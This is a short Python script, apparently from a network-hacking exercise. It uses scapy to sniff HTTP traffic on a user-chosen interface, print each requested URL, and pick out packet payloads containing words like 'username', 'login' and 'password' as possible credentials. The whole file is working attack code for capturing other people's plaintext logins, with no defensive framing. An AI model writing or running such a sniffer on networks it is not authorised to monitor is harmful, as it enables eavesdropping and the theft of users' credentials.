#!usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    #prn is callback process

def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "login", "id", "pswd", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = geturl(packet)
        print("[+] HTTP Request>> " + url)
        login_info = get_info(packet)
        if login_info:
            print("\n\n [+] Possible Username and Password" + login_info + "\n\n")

inp_ = raw_input("Enter Your Interface")
sniff(inp_)